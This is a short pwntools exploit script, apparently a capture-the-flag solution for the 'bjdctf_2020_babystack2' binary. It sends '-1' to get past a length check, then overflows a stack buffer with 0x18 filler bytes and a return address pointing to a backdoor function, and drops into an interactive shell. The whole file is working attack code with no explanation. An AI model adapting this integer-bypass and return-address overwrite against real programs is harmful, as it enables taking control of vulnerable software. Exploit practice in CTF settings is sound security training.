from pwn import *
io = process("./bjdctf_2020_babystack2")
context(log_level='debug')
backdoor = 0x00400726
io.recv()
io.sendline("-1")
io.recv()
payload = 'a'*0x18 + p64(backdoor)
io.send(payload)
io.interactive()